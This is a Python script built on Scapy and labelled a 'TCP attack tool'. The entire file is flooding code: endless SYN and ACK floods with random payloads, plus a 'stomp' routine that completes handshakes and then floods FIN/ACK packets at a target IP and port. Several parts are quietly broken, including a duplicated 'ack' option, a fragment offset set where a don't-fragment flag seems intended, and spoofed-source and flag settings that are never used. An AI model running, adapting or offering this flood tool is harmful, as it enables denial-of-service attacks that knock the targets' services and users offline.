from scapy.all import *
import random
import socket
import argparse

def rand_ip():
    return ".".join(str(random.randint(0, 255)) for _ in range(4))

def attack_tcp_syn(target_ips, options):
    ip_tos = options.get('ip_tos', 0)
    ip_ident = options.get('ip_ident', 0xffff)
    ip_ttl = options.get('ip_ttl', 64)
    dont_frag = options.get('dont_frag', True)
    sport = options.get('sport', 0xffff)
    dport = options.get('dport', 0xffff)
    seq = options.get('seq', 0xffff)
    ack = options.get('ack', 0)
    urg_fl = options.get('urg', False)
    ack_fl = options.get('ack', False)
    psh_fl = options.get('psh', False)
    rst_fl = options.get('rst', False)
    syn_fl = options.get('syn', True)
    fin_fl = options.get('fin', False)
    source_ip = options.get('source_ip', rand_ip())

    while True:
        for target_ip in target_ips:
            ip = IP(dst=target_ip, tos=ip_tos, id=ip_ident, ttl=ip_ttl, frag=1 if dont_frag else 0)
            tcp = TCP(sport=random.randint(1024, 65535) if sport == 0xffff else sport,
                      dport=dport,
                      seq=random.randint(0, 65535) if seq == 0xffff else seq,
                      ack=ack,
                      flags="S" if syn_fl else "",
                      options=[('MSS', 1400 + random.randint(0, 15)),
                               ('SACKPerm', b''),
                               ('Timestamp', (random.randint(0, 0xFFFFFFFF), 0)),
                               ('NOP', b''),
                               ('WindowScale', 6)]) # Window scale

            pkt = ip / tcp
            send(pkt, verbose=0)

def attack_tcp_ack(target_ips, options):
    ip_tos = options.get('ip_tos', 0)
    ip_ident = options.get('ip_ident', 0xffff)
    ip_ttl = options.get('ip_ttl', 64)
    dont_frag = options.get('dont_frag', False)
    sport = options.get('sport', 0xffff)
    dport = options.get('dport', 0xffff)
    seq = options.get('seq', 0xffff)
    ack = options.get('ack', 0xffff)
    urg_fl = options.get('urg', False)
    ack_fl = options.get('ack', True)
    psh_fl = options.get('psh', False)
    rst_fl = options.get('rst', False)
    syn_fl = options.get('syn', False)
    fin_fl = options.get('fin', False)
    data_len = options.get('payload_size', 512)
    data_rand = options.get('payload_rand', True)
    source_ip = options.get('source_ip', rand_ip())

    while True:
        for target_ip in target_ips:
            ip = IP(dst=target_ip, tos=ip_tos, id=ip_ident, ttl=ip_ttl, frag=1 if dont_frag else 0)
            tcp = TCP(sport=random.randint(1024, 65535) if sport == 0xffff else sport,
                      dport=dport,
                      seq=random.randint(0, 65535) if seq == 0xffff else seq,
                      ack=random.randint(0, 65535) if ack == 0xffff else ack,
                      flags="A" if ack_fl else "",
                      options=[('MSS', 1400 + random.randint(0, 15)),
                               ('SACKPerm', b''),
                               ('Timestamp', (random.randint(0, 0xFFFFFFFF), 0)),
                               ('NOP', b''),
                               ('WindowScale', 6)]) # Window scale

            data = random._urandom(data_len) if data_rand else b''
            pkt = ip / tcp / data
            send(pkt, verbose=0)

def attack_tcp_stomp(target_ips, options):
    ip_tos = options.get('ip_tos', 0)
    ip_ident = options.get('ip_ident', 0xffff)
    ip_ttl = options.get('ip_ttl', 64)
    dont_frag = options.get('dont_frag', True)
    dport = options.get('dport', 0xffff)
    urg_fl = options.get('urg', False)
    ack_fl = options.get('ack', True)
    psh_fl = options.get('psh', True)
    rst_fl = options.get('rst', False)
    syn_fl = options.get('syn', False)
    fin_fl = options.get('fin', False)
    data_len = options.get('payload_size', 768)
    data_rand = options.get('payload_rand', True)

    stomp_data = []

    for target_ip in target_ips:
        ip = IP(dst=target_ip, tos=ip_tos, id=ip_ident, ttl=ip_ttl, frag=1 if dont_frag else 0)
        tcp = TCP(dport=dport, flags="S", seq=random.randint(0, 65535), ack=0)
        pkt = ip / tcp
        resp = sr1(pkt, timeout=2, verbose=0)
        
        if resp and TCP in resp and resp[TCP].flags == "SA":
            stomp_data.append({
                'addr': resp[IP].src,
                'seq': resp[TCP].seq,
                'ack_seq': resp[TCP].ack,
                'sport': resp[TCP].dport,
                'dport': resp[TCP].sport
            })

    while True:
        for data in stomp_data:
            ip = IP(dst=data['addr'], tos=ip_tos, id=ip_ident, ttl=ip_ttl, frag=1 if dont_frag else 0)
            tcp = TCP(sport=data['sport'], dport=data['dport'], seq=data['ack_seq'], ack=data['seq'] + 1, flags="FA", window=random.randint(0, 65535))
            payload = random._urandom(data_len) if data_rand else b''
            pkt = ip / tcp / payload
            send(pkt, verbose=0)

if __name__ == "__main__":
    parser = argparse.ArgumentParser(description='TCP attack tool')
    parser.add_argument('-ip', type=str, help='Target IP address', required=True)
    parser.add_argument('-p', type=int, help='Target port', required=True)
    args = parser.parse_args()

    target_ips = [args.ip]
    options = {
        'ip_tos': 0,
        'ip_ident': 0xffff,
        'ip_ttl': 64,
        'dont_frag': True,
        'sport': 0xffff,
        'dport': args.p,
        'seq': 0xffff,
        'ack': 0,
        'urg': False,
        'ack': False,
        'psh': False,
        'rst': False,
        'syn': True,
        'fin': False,
        'source_ip': rand_ip()
    }

    attack_tcp_syn(target_ips, options)